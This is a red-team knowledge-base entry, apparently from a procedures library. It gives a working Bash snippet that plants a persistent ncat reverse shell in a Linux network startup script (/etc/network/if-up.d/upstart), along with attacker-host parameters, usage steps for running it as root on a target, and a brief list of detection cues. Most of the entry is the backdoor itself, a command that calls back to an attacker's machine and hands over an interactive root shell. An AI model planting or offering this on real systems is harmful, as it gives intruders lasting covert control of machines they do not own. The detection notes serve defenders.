---
id: 5c441a28-c876-4342-9fa4-59dfbc8c7a73
name: Bash-Script-to-Add-Reverse-Shell-to-if-up.d
type: code
language: Bash
verified: true
created_at: '2023-04-06T03:56:18.014038+00:00'
updated_at: '2023-04-10T20:34:19.954539+00:00'
platforms:
  - Linux
tags:
  - persistence
  - reverse-shell
  - backdoor
validated: true
---

# Bash-Script-to-Add-Reverse-Shell-to-if-up.d

## Code

```bash
RSHELL="ncat $LMTHD $LHOST $LPORT -e \"/bin/bash -c id;/bin/bash\" 2>/dev/null"
sed -i -e "4i \$RSHELL" /etc/network/if-up.d/upstart
```

## Description

This bash code snippet creates a persistent reverse shell by inserting an ncat command into the /etc/network/if-up.d/upstart script. When the network interface activates (e.g., on boot), it connects back to the specified host and port, runs 'id' to display user info, and spawns an interactive bash shell. Ideal for maintaining access on Linux systems after initial compromise.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $LMTHD | Optional ncat options (e.g., -v for verbose output) | -v |
| $LHOST | IP address of the attacker's listening machine | 192.168.1.100 |
| $LPORT | Port on which the attacker is listening | 4444 |

## Usage

Execute this code directly in a shell on the target after gaining root access. Ensure an ncat listener is running on the attacker side (e.g., `ncat -l -p 4444`). Trigger by restarting the network (`ifdown -a && ifup -a`) or rebooting. Used in red team operations for persistence in Linux environments, often chained with initial access techniques like SSH brute-force.

## Detection

- File monitoring tools (e.g., auditd) watching writes to /etc/network/if-up.d/*.
- Network logs showing outbound connections from init scripts to unusual IPs/ports during boot.
- Process anomalies: ncat spawned by networkd or ifup processes.
- String searches in startup scripts for 'ncat' or 'reverse shell' patterns.

## Related

- [[procedures/Linux-Startup-Service-Backdoor-with-Reverse-Shell]]
- [[tools/ncat]]
